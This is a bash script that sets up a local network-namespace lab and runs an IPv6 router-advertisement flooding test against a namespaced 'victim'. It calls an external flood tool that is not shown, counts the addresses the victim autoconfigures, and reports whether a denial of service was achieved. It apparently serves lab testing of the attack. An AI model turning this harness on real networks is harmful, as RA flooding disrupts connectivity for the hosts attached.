#!/bin/bash
# Simple IPv6 RA Flooding Demo - Ultra Safe
# Minimal demonstration to avoid system crashes

set -e

echo "🚀 ULTRA-SAFE IPv6 RA FLOODING TEST"
echo "=================================="
echo "Strategy: Minimal packets, basic monitoring only"
echo ""

# Simple cleanup function
cleanup() {
    echo "Cleaning up..."
    ip netns del victim 2>/dev/null || true
    ip link del veth-attacker 2>/dev/null || true
}
trap cleanup EXIT

# Create minimal network setup
echo "Setting up basic network..."
ip netns add victim
ip link add veth-attacker type veth peer name veth-victim
ip link set veth-victim netns victim

# Basic interface configuration
ip addr add 2001:db8:cafe::1/64 dev veth-attacker
ip link set veth-attacker up

ip netns exec victim ip addr add 2001:db8:cafe::2/64 dev veth-victim
ip netns exec victim ip link set veth-victim up
ip netns exec victim ip link set lo up

# Enable IPv6 autoconfiguration (minimal settings)
ip netns exec victim sysctl -w net.ipv6.conf.all.accept_ra=1 >/dev/null
ip netns exec victim sysctl -w net.ipv6.conf.veth-victim.accept_ra=1 >/dev/null

echo "Network setup complete."

# Get baseline
BASELINE=$(ip netns exec victim ip -6 addr show dev veth-victim | grep "scope global dynamic" | wc -l)
echo "Baseline dynamic addresses: $BASELINE"

# Test baseline connectivity
echo "Testing baseline connectivity..."
if ip netns exec victim ping6 -c 1 -W 2 2001:db8:cafe::1 >/dev/null 2>&1; then
    echo "✅ Baseline: Network working"
else
    echo "❌ Baseline: Network not responding"
fi

echo ""
echo "Running MINIMAL attack (25 packets, single thread)..."

# Ultra-minimal attack
python3 src/ra_flood.py -i veth-attacker -c 25 --threads 1

echo "Waiting for processing..."
sleep 5

# Check results
FINAL=$(ip netns exec victim ip -6 addr show dev veth-victim | grep "scope global dynamic" | wc -l)
ADDED=$((FINAL - BASELINE))

echo ""
echo "RESULTS:"
echo "========"
echo "Baseline: $BASELINE addresses"
echo "Final: $FINAL addresses"
echo "Added: $ADDED addresses"

if (( ADDED > 0 )); then
    echo "✅ SUCCESS: Attack generated $ADDED new addresses"
else
    echo "⚠️  No new addresses generated"
fi

# Test final connectivity
echo ""
echo "Testing final connectivity..."
if ip netns exec victim ping6 -c 1 -W 3 2001:db8:cafe::1 >/dev/null 2>&1; then
    echo "✅ Final: Network still responding"
else
    echo "❌ Final: Network unresponsive - DoS achieved!"
fi

echo ""
echo "Demo complete. System should be stable."
